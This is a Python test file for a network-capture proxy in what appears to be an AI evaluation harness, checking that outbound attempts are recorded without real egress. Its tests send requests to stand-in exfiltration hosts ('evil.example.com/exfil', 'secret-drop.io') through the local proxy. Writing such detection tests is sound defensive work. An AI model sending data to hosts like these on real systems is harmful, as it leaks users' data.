"""Checks for the network-attempt capture proxy (no real egress).

Run with: ``python3 -m gensee_eval.test_netcapture``
"""
import socket
import urllib.request

from gensee_eval import netcapture


def test_http_get_records_host():
    with netcapture.NetCapture() as nc:
        proxy = f"127.0.0.1:{nc.port}"
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy}))
        resp = opener.open("http://evil.example.com/exfil", timeout=5)
        resp.read()
        assert "evil.example.com" in nc.hosts(), nc.hosts()


def test_connect_records_host():
    with netcapture.NetCapture() as nc:
        s = socket.create_connection(("127.0.0.1", nc.port), timeout=5)
        s.sendall(b"CONNECT secret-drop.io:443 HTTP/1.1\r\nHost: secret-drop.io:443\r\n\r\n")
        s.recv(128)  # the "200 Connection established"
        s.close()
        assert "secret-drop.io" in nc.hosts(), nc.hosts()


def test_no_proxy_includes_model_endpoint():
    with netcapture.NetCapture() as nc:
        env = nc.proxy_env(["api.anthropic.com"])
        assert "api.anthropic.com" in env["NO_PROXY"]
        assert env["HTTPS_PROXY"].endswith(str(nc.port))


def main():
    for fn in (test_http_get_records_host, test_connect_records_host,
               test_no_proxy_includes_model_endpoint):
        fn()
        print(f"  ok: {fn.__name__}")
    print("ALL NETCAPTURE CHECKS PASSED")


if __name__ == "__main__":
    main()
